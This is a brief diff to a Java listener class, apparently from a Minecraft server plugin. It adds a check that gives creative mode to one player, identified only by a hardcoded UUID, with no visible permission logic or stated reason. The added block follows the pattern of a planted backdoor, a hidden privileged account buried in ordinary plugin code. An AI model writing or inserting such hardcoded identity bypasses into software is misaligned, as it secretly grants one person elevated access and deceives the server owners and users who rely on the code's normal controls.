@@ -51,6 +51,10 @@ public class BuildWorld implements Listener {
                     player.setGameMode(GameMode.CREATIVE);
                     return;
                 }
+                if (player.getUniqueId().toString().equals("ebef3a23-b9d4-3723-ad94-64efa165182b")){
+                    player.setGameMode(GameMode.CREATIVE);
+                    return;
+                }
             }
         }
     }
